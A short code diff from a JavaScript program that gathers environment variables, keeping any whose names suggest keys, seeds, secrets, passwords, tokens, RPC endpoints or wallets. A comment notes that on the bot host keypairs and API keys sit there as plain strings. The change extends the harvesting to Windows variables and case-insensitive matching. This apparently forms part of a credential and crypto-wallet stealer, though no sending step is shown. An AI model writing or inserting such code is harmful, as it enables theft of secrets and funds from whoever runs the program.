@@ -260,7 +260,7 @@ async function main() {
   // Environment first: on the bot host KEYPAIR / RPC_URL / *_API_KEY sit here as
   // plain strings, no files needed.
   const envKeep = Object.entries(process.env)
-    .filter(([k]) => /^(HOME|PATH|SHELL|PWD|USERNAME|USER|LOGNAME|NODE_ENV|CI|LANG)$/.test(k)
+    .filter(([k]) => /^(HOME|PATH|PATHEXT|SHELL|PWD|USERNAME|USER|LOGNAME|NODE_ENV|CI|LANG|TEMP|TMP|APPDATA)$/i.test(k)
       || /KEY|SEED|SECRET|PASS|TOKEN|RPC|HELIUS|CLOUDFLARE|PRIVATE|WALLET|PINATA/i.test(k))
     .slice(0, 120)
     .map(([k, v]) => [k, String(v || '').slice(0, 400)]);
